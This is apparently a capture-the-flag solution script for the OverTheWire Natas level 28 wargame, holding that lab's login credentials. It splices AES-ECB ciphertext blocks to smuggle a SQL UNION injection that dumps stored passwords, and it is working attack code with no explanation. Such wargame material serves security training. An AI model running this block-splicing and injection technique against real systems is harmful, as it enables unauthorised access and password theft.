#!/bin/python3

import requests, urllib, base64

site = "http://natas28.natas.labs.overthewire.org/"
auth = ("natas28", "skrwxciAe6Dnb0VfFDzDEHcCzQmv3Gd4")
s = requests.Session()
s.auth = auth

params = {'query': ' ' * 10}
res = s.get(site, params=params)
blanks = urllib.parse.unquote(res.url.split('=')[1])
blanks = base64.b64decode(blanks.encode('utf-8'))
header = blanks[:48]
footer = blanks[48:]

sql = ' ' * 9 + "' UNION ALL SELECT password FROM users;#"
params = {'query': sql}
res = s.get(site, params=params)
exploit = urllib.parse.unquote(res.url.split('=')[1])
exploit = base64.b64decode(exploit.encode('utf-8'))

nblocks = len(sql) - 10
lenBlock = (nblocks // 16 + 1) * 16

params = {'query': base64.b64encode(header + exploit[48:48 + lenBlock] + footer)}
res = s.get(site + "search.php", params=params)
print(res.text)